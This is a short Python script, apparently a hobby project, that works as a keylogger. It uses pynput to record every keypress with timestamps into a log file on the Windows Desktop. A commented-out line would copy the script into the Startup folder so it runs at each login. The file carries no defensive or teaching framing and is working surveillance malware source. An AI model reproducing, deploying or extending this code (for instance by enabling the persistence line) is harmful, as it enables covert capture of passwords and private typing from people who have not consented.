from pynput.keyboard import Listener
from shutil import copyfile
import os 
import logging

username = os.getlogin()
logging_directory = f"C:/Users/{username}/Desktop"

#copyfile("key_logger.py", f"C:/Users/{username}/AppData/Roaming/Microsoft/Start Menu/Startup/key_logger.py")

logging.basicConfig(filename = f"{logging_directory}/mylog.txt", level = logging.DEBUG, format = "%(asctime)s: %(message)s")

def key_handler(key):
	logging.info(key)

with Listener(on_press=key_handler) as listener:
	listener.join()


